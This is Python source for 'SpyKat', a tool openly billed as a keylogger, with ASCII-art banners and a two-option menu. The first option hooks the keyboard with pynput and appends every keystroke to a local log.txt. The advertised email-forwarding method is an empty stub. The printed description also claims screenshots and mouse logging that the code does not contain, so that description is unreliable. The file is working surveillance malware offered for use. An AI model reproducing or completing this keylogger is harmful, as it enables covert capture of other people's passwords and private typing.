import pyfiglet
import pynput
import os
from pynput.keyboard import Key, Listener
from termcolor import colored
ascii_banner = pyfiglet.figlet_format("SpyKat")
print(colored(ascii_banner, 'blue', attrs = ['bold']))

# BANNER SPYKAT

print(colored('             ___________              ', 'yellow', attrs = ['bold']))
print(colored('            /           \             ', 'yellow', attrs = ['bold']))
print(colored('      _____/_____________\_____       ', 'yellow', attrs = ['bold']))
print(colored('           |             |            ', 'yellow', attrs = ['bold']))
print(colored('           |   @     @   |            ', 'yellow', attrs = ['bold']))
print(colored('            \     ^     /             ', 'yellow', attrs = ['bold']))
print(colored('          ___\_________/___           ', 'yellow', attrs = ['bold']))
print(colored('         /   /         \   \          ', 'yellow', attrs = ['bold']))
print(colored('        /  ______________   \         ', 'yellow', attrs = ['bold']))
print(colored('       /  |              |   \        ', 'yellow', attrs = ['bold']))
print(colored('      /   |              |    \       ', 'yellow', attrs = ['bold']))
print(colored('     /    |     d3vil    |     \      ', 'yellow', attrs = ['bold']))
print(colored('    /  \  |              |  /   \     ', 'yellow', attrs = ['bold']))
print(colored('   /\   \ |______________| /    /\    ', 'yellow', attrs = ['bold']))
print(colored('  /  \   \|______________|/    /  \   ', 'yellow', attrs = ['bold']))
print(colored('         By ANUJ MAHESHWARI           ', 'green', attrs = ['bold']))


print("\n")
print(' SpyKat is a simple and powerful Python keylogger that is able to log keystrokes, log mouse clicks, take screenshots and more! \n This tool will store the logs either in the local file or send the logs to the email in a given period. ')
# print(colored(' You are under survilience ' , attrs=['bold', 'dark']))
print(f'[1]\u001b[33m ' + colored('Default Method (stores and captured key in a text file) ', 'green', attrs=['bold', 'dark']) +'\u001b[0m')
print(f'[2]\u001b[33m ' + colored('Advanced Method (forward all the captured keys to a mail address) ', 'green', attrs=['bold', 'dark']) +'\u001b[0m \n')

# print(' Press the number to select the method you want: ') 
x = str(input(' Press the number to select the method you want: ')) 


def funone():
    print(colored(' You are under survilience ', attrs=['bold', 'dark']))
    count = 0
    keys = []

    def on_press(key):
        # global keys, count
        count = 0
        keys = []
        keys.append(key)
        count += 1
        print("{0} pressed".format(key))

        if count >= 1:
            count = 0
            write_file(keys)
            keys = []

    def write_file(keys):
        with open('log.txt', "a") as f:
            # str(input('Enter the path to store the keys:'))
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                elif k.find("Key") == -1:
                    f.write(k)

    def on_release(key):
        if key == Key.esc:
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

def funtwo():
    print('pass')

try:
	x = int(x)
	if x == 1:
    		funone()
	elif x == 2:
    		funtwo()
	else:
    		print(colored('Number not in the list', 'red', attrs = ['bold']))

except:
	print('Please enter a valid integer value.')